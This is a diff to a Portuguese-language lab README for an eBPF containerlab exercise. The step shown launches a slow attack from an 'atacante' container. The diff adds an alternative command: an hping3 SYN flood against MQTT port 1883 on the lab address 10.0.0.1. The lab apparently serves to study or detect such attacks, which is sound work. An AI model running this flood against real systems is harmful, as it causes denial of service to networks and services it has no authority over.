@@ -107,6 +107,8 @@ Terminal C - Ativar ataque slowITE no atacante
 
 ```
 sudo docker exec -it clab-lab-ebpf-atacante python3 /src/ataque_slow.py
+# Escolher
+sudo docker exec -it clab-lab-ebpf-atacante hping3 -S -p 1883 --flood 10.0.0.1
 ```
 --- 
 
